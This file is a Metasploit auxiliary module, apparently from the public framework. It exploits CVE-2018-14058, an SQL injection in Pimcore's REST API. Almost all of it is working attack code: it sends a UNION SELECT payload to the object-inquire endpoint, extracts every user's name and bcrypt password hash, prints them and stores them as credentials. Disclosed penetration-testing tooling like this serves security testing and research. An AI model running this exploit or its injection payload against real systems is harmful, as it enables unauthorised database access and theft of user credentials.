##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Pimcore List Credentials',
      'Description'    => %q{
        This module extracts the usernames and hashed passwords of all users of the Pimcore web service by exploiting a SQL injection vulnerability in Pimcore's REST API.
      },
      'Author'         => [ 'Thongchai Silpavarangkura', # PoC
                            'N. Rai-Ngoen',              # PoC
                            'Shelby Pace'                # Metasploit Module
                          ],
      'License'        => MSF_LICENSE,
      'References'     => [
                            [ 'CVE', '2018-14058' ],
                            [ 'EDB', '45208' ]
                          ],
      'DisclosureDate' => 'Aug 13, 2018'
    ))

    register_options(
      [
        OptString.new('TARGETURI', [ true, 'The base path to pimcore', '/' ]),
        OptString.new('APIKEY', [ true, 'The valid API key for Pimcore REST API', '' ])
      ])
  end

  def available?
    res = send_request_cgi(
      'method'  =>  'GET',
      'uri'     =>  normalize_uri(target_uri.path)
    )

    false unless res && res.body.include?('pimcore')

    true
  end

  def get_creds
    api_uri = "/webservice/rest/object-inquire?apikey=#{datastore['APIKEY']}&id="
    api_uri = normalize_uri(target_uri.path, api_uri)
    cmd = '1) UNION ALL SELECT CONCAT(name," ",password) from users#'
    cmd = Rex::Text.uri_encode(cmd, 'hex-all')

    res = send_request_cgi(
      'method'  =>  'GET',
      'uri'     =>  api_uri << cmd
    )

    unless res and res.body.include?('"success":true')
      fail_with(Failure::NotFound, 'The request returned no results.')
    end

    format_results(res.get_json_document['data'])
  end

  def format_results(response)
    fail_with(Failure::NotFound, 'No data found') unless response
    creds = response.to_s.scan(/"([^\s]*)\s(\$[^(=>)]*)"/)
    fail_with(Failure::NotFound, 'Could not find any credentials') if creds.empty?

    print_good("Credentials obtained:")
    creds.each do |user, pass|
      print_good("#{user} : #{pass}")
      store_creds(user, pass)
    end
  end

  def store_creds(username, hash)
    store_valid_credential(
      user: username,
      private: hash,
      private_type: :nonreplayable_hash,
      service_data: {
        jtr_format: 'bcrypt',
        origin_type: :service,
        address: rhost,
        port: rport,
        service_name: 'mysql',
        protocol: 'tcp'
      }
    )
  end

  def run
    fail_with(Failure::NotFound, 'Could not access the Pimcore web page.') unless available?
    get_creds
  end
end
